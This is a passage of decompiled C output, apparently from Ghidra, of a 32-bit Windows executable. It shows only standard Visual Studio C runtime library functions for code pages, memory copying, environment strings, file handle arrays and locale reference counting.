      *(undefined **)(p_Var2 + 0x48) = PTR_DAT_0041b710;
      _Memory = (int *)PTR_DAT_0041b710;
      LOCK();
      *(int *)PTR_DAT_0041b710 = *(int *)PTR_DAT_0041b710 + 1;
    }
    FUN_0040b9c2();
  }
  return _Memory;
}



void FUN_0040b9c2(void)

{
  ___acrt_unlock(5);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __setmbcp_nolock
// 
// Library: Visual Studio 2015 Release

void __cdecl __setmbcp_nolock(int param_1,__crt_multibyte_data *param_2)

{
  byte bVar1;
  undefined2 uVar2;
  uint uVar3;
  uint uVar4;
  BOOL BVar5;
  BYTE *pBVar6;
  __crt_multibyte_data *p_Var7;
  wchar_t *pwVar8;
  byte *pbVar9;
  int iVar10;
  byte *pbVar11;
  undefined2 *puVar12;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined uVar13;
  undefined2 *puVar14;
  uint uVar15;
  undefined uVar16;
  int in_stack_ffffffdc;
  int local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  uVar3 = getSystemCP(param_1);
  uVar16 = (undefined)in_stack_ffffffdc;
  if (uVar3 != 0) {
    uVar15 = 0;
    uVar4 = 0;
    local_20 = 0;
LAB_0040ba11:
    if (*(uint *)((int)&DAT_0041b1f8 + uVar4) != uVar3) goto code_r0x0040ba1d;
    _memset(param_2 + 0x18,0,0x101);
    in_stack_ffffffdc = local_20 * 0x30;
    pbVar9 = &DAT_0041b208 + in_stack_ffffffdc;
    do {
      bVar1 = *pbVar9;
      pbVar11 = pbVar9;
      while ((bVar1 != 0 && (bVar1 = pbVar11[1], bVar1 != 0))) {
        for (uVar4 = (uint)*pbVar11; (uVar4 <= bVar1 && (uVar4 < 0x100)); uVar4 = uVar4 + 1) {
          param_2[uVar4 + 0x19] =
               (__crt_multibyte_data)((byte)param_2[uVar4 + 0x19] | (&DAT_0041b1f4)[uVar15]);
          bVar1 = pbVar11[1];
        }
        pbVar11 = pbVar11 + 2;
        bVar1 = *pbVar11;
      }
      uVar15 = uVar15 + 1;
      pbVar9 = pbVar9 + 8;
    } while (uVar15 < 4);
    *(uint *)(param_2 + 4) = uVar3;
    *(undefined4 *)(param_2 + 8) = 1;
    pwVar8 = CPtoLocaleName(uVar3);
    *(wchar_t **)(param_2 + 0x21c) = pwVar8;
    puVar12 = (undefined2 *)(param_2 + 0xc);
    puVar14 = (undefined2 *)(&DAT_0041b1fc + in_stack_ffffffdc);
    iVar10 = 6;
    do {
      uVar2 = *puVar14;
      puVar14 = puVar14 + 1;
      *puVar12 = uVar2;
      puVar12 = puVar12 + 1;
      iVar10 = iVar10 + -1;
    } while (iVar10 != 0);
    goto LAB_0040bbaa;
  }
  setSBCS(param_2);
  uVar13 = extraout_DL_00;
LAB_0040bbb4:
  FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,uVar13,uVar16);
  return;
code_r0x0040ba1d:
  local_20 = local_20 + 1;
  uVar4 = uVar4 + 0x30;
  if (0xef < uVar4) goto code_r0x0040ba2b;
  goto LAB_0040ba11;
code_r0x0040ba2b:
  uVar13 = extraout_DL;
  if ((uVar3 != 65000) && (uVar3 != 0xfde9)) {
    BVar5 = IsValidCodePage(uVar3 & 0xffff);
    uVar16 = (undefined)in_stack_ffffffdc;
    uVar13 = extraout_DL_01;
    if (BVar5 != 0) {
      BVar5 = GetCPInfo(uVar3,&local_1c);
      uVar16 = (undefined)in_stack_ffffffdc;
      if (BVar5 == 0) {
        uVar13 = extraout_DL_02;
        if (_DAT_0041c1f4 != 0) {
          setSBCS(param_2);
          uVar13 = extraout_DL_03;
        }
      }
      else {
        _memset(param_2 + 0x18,0,0x101);
        *(uint *)(param_2 + 4) = uVar3;
        *(undefined4 *)(param_2 + 0x21c) = 0;
        if (local_1c.MaxCharSize < 2) {
          *(undefined4 *)(param_2 + 8) = 0;
        }
        else {
          pBVar6 = local_1c.LeadByte;
          while ((local_1c.LeadByte[0] != 0 && (bVar1 = pBVar6[1], bVar1 != 0))) {
            for (uVar3 = (uint)*pBVar6; uVar3 <= bVar1; uVar3 = uVar3 + 1) {
              param_2[uVar3 + 0x19] = (__crt_multibyte_data)((byte)param_2[uVar3 + 0x19] | 4);
            }
            pBVar6 = pBVar6 + 2;
            local_1c.LeadByte[0] = *pBVar6;
          }
          p_Var7 = param_2 + 0x1a;
          iVar10 = 0xfe;
          do {
            *p_Var7 = (__crt_multibyte_data)((byte)*p_Var7 | 8);
            p_Var7 = p_Var7 + 1;
            iVar10 = iVar10 + -1;
          } while (iVar10 != 0);
          pwVar8 = CPtoLocaleName(*(int *)(param_2 + 4));
          *(wchar_t **)(param_2 + 0x21c) = pwVar8;
          *(undefined4 *)(param_2 + 8) = 1;
        }
        *(undefined4 *)(param_2 + 0xc) = 0;
        *(undefined4 *)(param_2 + 0x10) = 0;
        *(undefined4 *)(param_2 + 0x14) = 0;
LAB_0040bbaa:
        uVar16 = (undefined)in_stack_ffffffdc;
        setSBUpLow(param_2);
        uVar13 = extraout_DL_04;
      }
    }
  }
  goto LAB_0040bbb4;
}



// Library Function - Single Match
//  _memcpy_s
// 
// Libraries: Visual Studio 2012, Visual Studio 2015, Visual Studio 2017, Visual Studio 2019

errno_t __cdecl _memcpy_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  errno_t eVar1;
  int *piVar2;
  
  if (_MaxCount == 0) {
    eVar1 = 0;
  }
  else if (_Dst == (void *)0x0) {
    piVar2 = __errno();
    eVar1 = 0x16;
    *piVar2 = 0x16;
    FUN_004091be();
  }
  else if ((_Src == (void *)0x0) || (_DstSize < _MaxCount)) {
    _memset(_Dst,0,_DstSize);
    if (_Src == (void *)0x0) {
      piVar2 = __errno();
      eVar1 = 0x16;
    }
    else {
      if (_MaxCount <= _DstSize) {
        return 0x16;
      }
      piVar2 = __errno();
      eVar1 = 0x22;
    }
    *piVar2 = eVar1;
    FUN_004091be();
  }
  else {
    FID_conflict__memcpy(_Dst,_Src,_MaxCount);
    eVar1 = 0;
  }
  return eVar1;
}



// Library Function - Single Match
//  int __cdecl x_ismbbtype_l(struct __crt_locale_pointers *,unsigned int,int,int)
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release, Visual Studio 2017 Debug, Visual
// Studio 2017 Release

int __cdecl x_ismbbtype_l(__crt_locale_pointers *param_1,uint param_2,int param_3,int param_4)

{
  uint uVar1;
  int iVar2;
  int local_14;
  int *local_10;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,param_1);
  if ((*(byte *)(local_c + 0x19 + (param_2 & 0xff)) & (byte)param_4) == 0) {
    iVar2 = 0;
    if (param_3 == 0) {
      uVar1 = 0;
    }
    else {
      uVar1 = (uint)*(ushort *)(*local_10 + (param_2 & 0xff) * 2) & param_3;
    }
    if (uVar1 == 0) goto LAB_0040bc87;
  }
  iVar2 = 1;
LAB_0040bc87:
  if (local_8 != '\0') {
    *(uint *)(local_14 + 0x350) = *(uint *)(local_14 + 0x350) & 0xfffffffd;
  }
  return iVar2;
}



// Library Function - Single Match
//  __ismbblead
// 
// Library: Visual Studio 2015 Release

int __cdecl __ismbblead(uint _C)

{
  int iVar1;
  
  iVar1 = x_ismbbtype_l((__crt_locale_pointers *)0x0,_C,0,4);
  return iVar1;
}



// Library Function - Single Match
//  wchar_t const * __cdecl find_end_of_double_null_terminated_sequence(wchar_t const * const)
// 
// Library: Visual Studio 2015 Release

wchar_t * __cdecl find_end_of_double_null_terminated_sequence(wchar_t *param_1)

{
  short sVar1;
  short *psVar2;
  
  sVar1 = *(short *)param_1;
  while (sVar1 != 0) {
    psVar2 = (short *)param_1;
    do {
      sVar1 = *psVar2;
      psVar2 = psVar2 + 1;
    } while (sVar1 != 0);
    param_1 = (wchar_t *)((int)param_1 + (((int)psVar2 - (int)((int)param_1 + 2) >> 1) + 1) * 2);
    sVar1 = *(short *)param_1;
  }
  return (wchar_t *)(short *)((int)param_1 + 2);
}



// Library Function - Single Match
//  ___dcrt_get_narrow_environment_from_os
// 
// Library: Visual Studio 2015 Release

LPSTR ___dcrt_get_narrow_environment_from_os(void)

{
  LPWCH lpWideCharStr;
  wchar_t *pwVar1;
  size_t cbMultiByte;
  LPSTR lpMultiByteStr;
  int iVar2;
  LPSTR pCVar3;
  
  lpWideCharStr = GetEnvironmentStringsW();
  if (lpWideCharStr != (LPWCH)0x0) {
    pwVar1 = find_end_of_double_null_terminated_sequence((wchar_t *)lpWideCharStr);
    iVar2 = (int)pwVar1 - (int)lpWideCharStr >> 1;
    cbMultiByte = WideCharToMultiByte(0,0,lpWideCharStr,iVar2,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0);
    if (cbMultiByte != 0) {
      lpMultiByteStr = (LPSTR)__malloc_base(cbMultiByte);
      if (lpMultiByteStr == (LPSTR)0x0) {
LAB_0040bd68:
        pCVar3 = (LPSTR)0x0;
      }
      else {
        iVar2 = WideCharToMultiByte(0,0,lpWideCharStr,iVar2,lpMultiByteStr,cbMultiByte,(LPCSTR)0x0,
                                    (LPBOOL)0x0);
        if (iVar2 == 0) goto LAB_0040bd68;
        pCVar3 = lpMultiByteStr;
        lpMultiByteStr = (LPSTR)0x0;
      }
      FID_conflict__free(lpMultiByteStr);
      goto LAB_0040bd75;
    }
  }
  pCVar3 = (LPSTR)0x0;
LAB_0040bd75:
  if (lpWideCharStr != (LPWCH)0x0) {
    FreeEnvironmentStringsW(lpWideCharStr);
  }
  return pCVar3;
}



// Library Function - Single Match
//  ___acrt_lowio_create_handle_array
// 
// Library: Visual Studio 2015 Release

undefined4 * ___acrt_lowio_create_handle_array(void)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  
  puVar2 = (undefined4 *)__calloc_base(0x40,0x30);
  if (puVar2 == (undefined4 *)0x0) {
    puVar2 = (undefined4 *)0x0;
  }
  else if (puVar2 != puVar2 + 0x300) {
    puVar3 = puVar2 + 8;
    do {
      ___acrt_InitializeCriticalSectionEx_12((LPCRITICAL_SECTION)(puVar3 + -8),4000,0);
      puVar3[-2] = 0xffffffff;
      *puVar3 = 0;
      puVar3[1] = 0;
      puVar1 = puVar3 + 4;
      puVar3[2] = 0xa0a0000;
      *(undefined *)(puVar3 + 3) = 10;
      *(byte *)((int)puVar3 + 0xd) = *(byte *)((int)puVar3 + 0xd) & 0xf8;
      *(undefined *)((int)puVar3 + 0xe) = 0;
      puVar3 = puVar3 + 0xc;
    } while (puVar1 != puVar2 + 0x300);
  }
  FID_conflict__free((void *)0x0);
  return puVar2;
}



// Library Function - Single Match
//  ___acrt_lowio_destroy_handle_array
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_lowio_destroy_handle_array(LPCRITICAL_SECTION param_1)

{
  LPCRITICAL_SECTION lpCriticalSection;
  
  if (param_1 != (LPCRITICAL_SECTION)0x0) {
    lpCriticalSection = param_1;
    if (param_1 != param_1 + 0x80) {
      do {
        DeleteCriticalSection(lpCriticalSection);
        lpCriticalSection = lpCriticalSection + 2;
      } while (lpCriticalSection != param_1 + 0x80);
    }
    FID_conflict__free(param_1);
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___acrt_lowio_ensure_fh_exists
// 
// Library: Visual Studio 2015 Release

undefined4 __cdecl ___acrt_lowio_ensure_fh_exists(uint param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 uVar4;
  int iVar5;
  
  if (param_1 < 0x2000) {
    uVar4 = 0;
    ___acrt_lock(7);
    iVar5 = 0;
    iVar3 = DAT_0041c1c8;
    while (iVar3 <= (int)param_1) {
      if ((&DAT_0041bfc8)[iVar5] == 0) {
        puVar2 = ___acrt_lowio_create_handle_array();
        (&DAT_0041bfc8)[iVar5] = puVar2;
        if (puVar2 == (undefined4 *)0x0) {
          uVar4 = 0xc;
          break;
        }
        iVar3 = DAT_0041c1c8 + 0x40;
        DAT_0041c1c8 = iVar3;
      }
      iVar5 = iVar5 + 1;
    }
    FUN_0040bec7();
  }
  else {
    piVar1 = __errno();
    uVar4 = 9;
    *piVar1 = 9;
    FUN_004091be();
  }
  return uVar4;
}



void FUN_0040bec7(void)

{
  ___acrt_unlock(7);
  return;
}



// Library Function - Single Match
//  ___acrt_lowio_lock_fh
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_lowio_lock_fh(uint param_1)

{
  EnterCriticalSection
            ((LPCRITICAL_SECTION)((param_1 & 0x3f) * 0x30 + (&DAT_0041bfc8)[(int)param_1 >> 6]));
  return;
}



// Library Function - Single Match
//  ___acrt_lowio_unlock_fh
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_lowio_unlock_fh(uint param_1)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)((param_1 & 0x3f) * 0x30 + (&DAT_0041bfc8)[(int)param_1 >> 6]));
  return;
}



// Library Function - Single Match
//  __free_osfhnd
// 
// Library: Visual Studio 2015 Release

int __cdecl __free_osfhnd(int param_1)

{
  int iVar1;
  int *piVar2;
  ulong *puVar3;
  int iVar4;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_0041c1c8)) {
    iVar4 = (param_1 & 0x3fU) * 0x30;
    if (((*(byte *)(iVar4 + 0x28 + (&DAT_0041bfc8)[param_1 >> 6]) & 1) != 0) &&
       (*(int *)(iVar4 + 0x18 + (&DAT_0041bfc8)[param_1 >> 6]) != -1)) {
      iVar1 = FUN_004070e4();
      if (iVar1 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0040bf7c;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_0040bf7c:
      *(undefined4 *)(iVar4 + 0x18 + (&DAT_0041bfc8)[param_1 >> 6]) = 0xffffffff;
      return 0;
    }
  }
  piVar2 = __errno();
  *piVar2 = 9;
  puVar3 = ___doserrno();
  *puVar3 = 0;
  return -1;
}



// Library Function - Single Match
//  __get_osfhandle
// 
// Library: Visual Studio 2015 Release

intptr_t __cdecl __get_osfhandle(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041c1c8)) {
      iVar3 = (_FileHandle & 0x3fU) * 0x30;
      if ((*(byte *)((&DAT_0041bfc8)[_FileHandle >> 6] + 0x28 + iVar3) & 1) != 0) {
        return *(intptr_t *)((&DAT_0041bfc8)[_FileHandle >> 6] + 0x18 + iVar3);
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_004091be();
  }
  return -1;
}



// Library Function - Single Match
//  ___pctype_func
// 
// Library: Visual Studio 2015 Release

ushort * __cdecl ___pctype_func(void)

{
  __acrt_ptd *p_Var1;
  ushort **local_8;
  
  p_Var1 = ___acrt_getptd();
  local_8 = *(ushort ***)(p_Var1 + 0x4c);
  ___acrt_update_locale_info((int)p_Var1,(int *)&local_8);
  return *local_8;
}



// Library Function - Single Match
//  ___acrt_locale_free_monetary
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

void __cdecl ___acrt_locale_free_monetary(int param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0xc) != PTR_DAT_0041b72c) {
      FID_conflict__free(*(undefined **)(param_1 + 0xc));
    }
    if (*(undefined **)(param_1 + 0x10) != PTR_DAT_0041b730) {
      FID_conflict__free(*(undefined **)(param_1 + 0x10));
    }
    if (*(undefined **)(param_1 + 0x14) != PTR_DAT_0041b734) {
      FID_conflict__free(*(undefined **)(param_1 + 0x14));
    }
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_0041b738) {
      FID_conflict__free(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x1c) != PTR_DAT_0041b73c) {
      FID_conflict__free(*(undefined **)(param_1 + 0x1c));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_0041b740) {
      FID_conflict__free(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x24) != PTR_DAT_0041b744) {
      FID_conflict__free(*(undefined **)(param_1 + 0x24));
    }
    if (*(undefined **)(param_1 + 0x38) != PTR_DAT_0041b758) {
      FID_conflict__free(*(undefined **)(param_1 + 0x38));
    }
    if (*(undefined **)(param_1 + 0x3c) != PTR_DAT_0041b75c) {
      FID_conflict__free(*(undefined **)(param_1 + 0x3c));
    }
    if (*(undefined **)(param_1 + 0x40) != PTR_DAT_0041b760) {
      FID_conflict__free(*(undefined **)(param_1 + 0x40));
    }
    if (*(undefined **)(param_1 + 0x44) != PTR_DAT_0041b764) {
      FID_conflict__free(*(undefined **)(param_1 + 0x44));
    }
    if (*(undefined **)(param_1 + 0x48) != PTR_DAT_0041b768) {
      FID_conflict__free(*(undefined **)(param_1 + 0x48));
    }
    if (*(undefined **)(param_1 + 0x4c) != PTR_DAT_0041b76c) {
      FID_conflict__free(*(undefined **)(param_1 + 0x4c));
    }
  }
  return;
}



// Library Function - Single Match
//  ___acrt_locale_free_numeric
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

void __cdecl ___acrt_locale_free_numeric(void **param_1)

{
  if (param_1 != (void **)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_0041b720) {
      FID_conflict__free(*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_0041b724) {
      FID_conflict__free(param_1[1]);
    }
    if ((undefined *)param_1[2] != PTR_DAT_0041b728) {
      FID_conflict__free(param_1[2]);
    }
    if ((undefined *)param_1[0xc] != PTR_DAT_0041b750) {
      FID_conflict__free(param_1[0xc]);
    }
    if ((undefined *)param_1[0xd] != PTR_DAT_0041b754) {
      FID_conflict__free(param_1[0xd]);
    }
  }
  return;
}



// Library Function - Single Match
//  void __cdecl free_crt_array_internal(void const * * const,unsigned int)
// 
// Library: Visual Studio 2015 Release

void __cdecl free_crt_array_internal(void **param_1,uint param_2)

{
  uint uVar1;
  uint uVar2;
  
  uVar2 = 0;
  uVar1 = ~-(uint)(param_1 + param_2 < param_1) &
          (uint)((int)(param_1 + param_2) + (3 - (int)param_1)) >> 2;
  if (uVar1 != 0) {
    do {
      FID_conflict__free(*param_1);
      uVar2 = uVar2 + 1;
      param_1 = param_1 + 1;
    } while (uVar2 != uVar1);
  }
  return;
}



// Library Function - Single Match
//  ___acrt_locale_free_time
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_locale_free_time(void **param_1)

{
  if (param_1 != (void **)0x0) {
    free_crt_array_internal(param_1,7);
    free_crt_array_internal(param_1 + 7,7);
    free_crt_array_internal(param_1 + 0xe,0xc);
    free_crt_array_internal(param_1 + 0x1a,0xc);
    free_crt_array_internal(param_1 + 0x26,2);
    FID_conflict__free(param_1[0x28]);
    FID_conflict__free(param_1[0x29]);
    FID_conflict__free(param_1[0x2a]);
    free_crt_array_internal(param_1 + 0x2d,7);
    free_crt_array_internal(param_1 + 0x34,7);
    free_crt_array_internal(param_1 + 0x3b,0xc);
    free_crt_array_internal(param_1 + 0x47,0xc);
    free_crt_array_internal(param_1 + 0x53,2);
    FID_conflict__free(param_1[0x55]);
    FID_conflict__free(param_1[0x56]);
    FID_conflict__free(param_1[0x57]);
    FID_conflict__free(param_1[0x58]);
  }
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  ___acrt_GetStringTypeA
// 
// Library: Visual Studio 2015 Release

void __cdecl
___acrt_GetStringTypeA
          (__crt_locale_pointers *param_1,DWORD param_2,LPCSTR param_3,int param_4,LPWORD param_5,
          UINT param_6,int param_7)

{
  uint _Size;
  uint uVar1;
  int iVar2;
  undefined4 *lpWideCharStr;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar3;
  undefined4 *puVar4;
  int in_stack_ffffffe4;
  int local_18;
  char local_10;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffe4,param_1);
  if (param_6 == 0) {
    param_6 = *(UINT *)(local_18 + 8);
  }
  iVar2 = MultiByteToWideChar(param_6,(uint)(param_7 != 0) * 8 + 1,param_3,param_4,(LPWSTR)0x0,0);
  uVar3 = extraout_DL;
  if (iVar2 == 0) goto LAB_0040c3b5;
  _Size = iVar2 * 2;
  if ((_Size + 8 & -(uint)(_Size < _Size + 8)) == 0) {
    lpWideCharStr = (undefined4 *)0x0;
LAB_0040c376:
    if (lpWideCharStr != (undefined4 *)0x0) {
      _memset(lpWideCharStr,0,_Size);
      iVar2 = MultiByteToWideChar(param_6,1,param_3,param_4,(LPWSTR)lpWideCharStr,iVar2);
      if (iVar2 != 0) {
        GetStringTypeW(param_2,(LPCWSTR)lpWideCharStr,iVar2,param_5);
      }
    }
  }
  else if ((-(uint)(_Size < _Size + 8) & _Size + 8) < 0x401) {
    puVar4 = (undefined4 *)&stack0xffffffd8;
    lpWideCharStr = (undefined4 *)&stack0xffffffd8;
    if (&stack0x00000000 != (undefined *)0x28) {
LAB_0040c36f:
      lpWideCharStr = puVar4 + 2;
      goto LAB_0040c376;
    }
  }
  else {
    lpWideCharStr = (undefined4 *)__malloc_base(-(uint)(_Size < _Size + 8) & _Size + 8);
    if (lpWideCharStr != (undefined4 *)0x0) {
      *lpWideCharStr = 0xdddd;
      puVar4 = lpWideCharStr;
      goto LAB_0040c36f;
    }
  }
  __freea_crt((int)lpWideCharStr);
  uVar3 = extraout_DL_00;
LAB_0040c3b5:
  if (local_10 != '\0') {
    *(uint *)(in_stack_ffffffe4 + 0x350) = *(uint *)(in_stack_ffffffe4 + 0x350) & 0xfffffffd;
  }
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,uVar3,SUB41(in_stack_ffffffe4,0));
  return;
}



// Library Function - Single Match
//  __freea_crt
// 
// Library: Visual Studio 2015 Release

void __cdecl __freea_crt(int param_1)

{
  if ((param_1 != 0) && (*(int *)(param_1 + -8) == 0xdddd)) {
    FID_conflict__free((int *)(param_1 + -8));
  }
  return;
}



// Library Function - Single Match
//  ___acrt_add_locale_ref
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void __cdecl ___acrt_add_locale_ref(int param_1)

{
  int *piVar1;
  int **ppiVar2;
  int iVar3;
  
  LOCK();
  *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + 1;
  piVar1 = *(int **)(param_1 + 0x7c);
  if (piVar1 != (int *)0x0) {
    LOCK();
    *piVar1 = *piVar1 + 1;
  }
  piVar1 = *(int **)(param_1 + 0x84);
  if (piVar1 != (int *)0x0) {
    LOCK();
    *piVar1 = *piVar1 + 1;
  }
  piVar1 = *(int **)(param_1 + 0x80);
  if (piVar1 != (int *)0x0) {
    LOCK();
    *piVar1 = *piVar1 + 1;
  }
  piVar1 = *(int **)(param_1 + 0x8c);
  if (piVar1 != (int *)0x0) {
    LOCK();
    *piVar1 = *piVar1 + 1;
  }
  ppiVar2 = (int **)(param_1 + 0x28);
  iVar3 = 6;
  do {
    if ((ppiVar2[-2] != (int *)&DAT_0041b1f0) && (piVar1 = *ppiVar2, piVar1 != (int *)0x0)) {
      LOCK();
      *piVar1 = *piVar1 + 1;
    }
    if ((ppiVar2[-3] != (int *)0x0) && (piVar1 = ppiVar2[-1], piVar1 != (int *)0x0)) {
      LOCK();
      *piVar1 = *piVar1 + 1;
    }
    ppiVar2 = ppiVar2 + 4;
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  ___acrt_locale_add_lc_time_reference(*(undefined ***)(param_1 + 0x9c));
  return;
}



// Library Function - Single Match
//  ___acrt_free_locale
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

void __cdecl ___acrt_free_locale(void *param_1)

{
  int *piVar1;
  void **ppvVar2;
  int **ppiVar3;
  int local_8;
  
  if ((((*(undefined ***)((int)param_1 + 0x88) != (undefined **)0x0) &&
       (*(undefined ***)((int)param_1 + 0x88) != &PTR_DAT_0041b720)) &&
      (*(int **)((int)param_1 + 0x7c) != (int *)0x0)) && (**(int **)((int)param_1 + 0x7c) == 0)) {
    piVar1 = *(int **)((int)param_1 + 0x84);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      FID_conflict__free(piVar1);
      ___acrt_locale_free_monetary(*(int *)((int)param_1 + 0x88));
    }
    piVar1 = *(int **)((int)param_1 + 0x80);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      FID_conflict__free(piVar1);
      ___acrt_locale_free_numeric(*(void ***)((int)param_1 + 0x88));
    }
    FID_conflict__free(*(void **)((int)param_1 + 0x7c));
    FID_conflict__free(*(void **)((int)param_1 + 0x88));
  }
  if ((*(int **)((int)param_1 + 0x8c) != (int *)0x0) && (**(int **)((int)param_1 + 0x8c) == 0)) {
    FID_conflict__free((void *)(*(int *)((int)param_1 + 0x90) + -0xfe));
    FID_conflict__free((void *)(*(int *)((int)param_1 + 0x94) + -0x80));
    FID_conflict__free((void *)(*(int *)((int)param_1 + 0x98) + -0x80));
    FID_conflict__free(*(void **)((int)param_1 + 0x8c));
  }
  ___acrt_locale_free_lc_time_if_unreferenced(*(undefined ***)((int)param_1 + 0x9c));
  ppvVar2 = (void **)((int)param_1 + 0xa0);
  local_8 = 6;
  ppiVar3 = (int **)((int)param_1 + 0x28);
  do {
    if (((ppiVar3[-2] != (int *)&DAT_0041b1f0) && (piVar1 = *ppiVar3, piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      FID_conflict__free(piVar1);
      FID_conflict__free(*ppvVar2);
    }
    if (((ppiVar3[-3] != (int *)0x0) && (piVar1 = ppiVar3[-1], piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      FID_conflict__free(piVar1);
    }
    ppvVar2 = ppvVar2 + 1;
    ppiVar3 = ppiVar3 + 4;
    local_8 = local_8 + -1;
  } while (local_8 != 0);
  FID_conflict__free(param_1);
  return;
}



// Library Function - Single Match
//  ___acrt_locale_add_lc_time_reference
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

undefined * __cdecl ___acrt_locale_add_lc_time_reference(undefined **param_1)

{
  undefined **ppuVar1;
  undefined *puVar2;
  
  if ((param_1 != (undefined **)0x0) && (param_1 != &PTR_DAT_00415688)) {
    LOCK();
    ppuVar1 = param_1 + 0x2c;
    puVar2 = *ppuVar1;
    *ppuVar1 = *ppuVar1 + 1;
    return puVar2 + 1;
  }
  return (undefined *)0x7fffffff;
}



// Library Function - Single Match
//  ___acrt_locale_free_lc_time_if_unreferenced
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

void __cdecl ___acrt_locale_free_lc_time_if_unreferenced(undefined **param_1)

{
  if (((param_1 != (undefined **)0x0) && (param_1 != &PTR_DAT_00415688)) &&
     (param_1[0x2c] == (undefined *)0x0)) {
    ___acrt_locale_free_time(param_1);
    FID_conflict__free(param_1);
  }
  return;
}



// Library Function - Single Match
//  ___acrt_locale_release_lc_time_reference
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

undefined * __cdecl ___acrt_locale_release_lc_time_reference(undefined **param_1)

{
  undefined **ppuVar1;
  undefined *puVar2;
  
  if ((param_1 != (undefined **)0x0) && (param_1 != &PTR_DAT_00415688)) {
    LOCK();
    ppuVar1 = param_1 + 0x2c;
    puVar2 = *ppuVar1;
    *ppuVar1 = *ppuVar1 + -1;
    return puVar2 + -1;
  }
  return (undefined *)0x7fffffff;
}



// Library Function - Single Match
//  ___acrt_release_locale_ref
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void __cdecl ___acrt_release_locale_ref(int param_1)

{
  int *piVar1;
  int **ppiVar2;
  int iVar3;
  
  if (param_1 != 0) {
    LOCK();
    *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + -1;
    piVar1 = *(int **)(param_1 + 0x7c);
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + -1;
    }
    piVar1 = *(int **)(param_1 + 0x84);
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + -1;
    }
    piVar1 = *(int **)(param_1 + 0x80);
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + -1;
    }
    piVar1 = *(int **)(param_1 + 0x8c);
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + -1;
    }
    ppiVar2 = (int **)(param_1 + 0x28);
    iVar3 = 6;
    do {
      if ((ppiVar2[-2] != (int *)&DAT_0041b1f0) && (piVar1 = *ppiVar2, piVar1 != (int *)0x0)) {
        LOCK();
        *piVar1 = *piVar1 + -1;
      }
      if ((ppiVar2[-3] != (int *)0x0) && (piVar1 = ppiVar2[-1], piVar1 != (int *)0x0)) {
        LOCK();
        *piVar1 = *piVar1 + -1;
      }
      ppiVar2 = ppiVar2 + 4;
      iVar3 = iVar3 + -1;
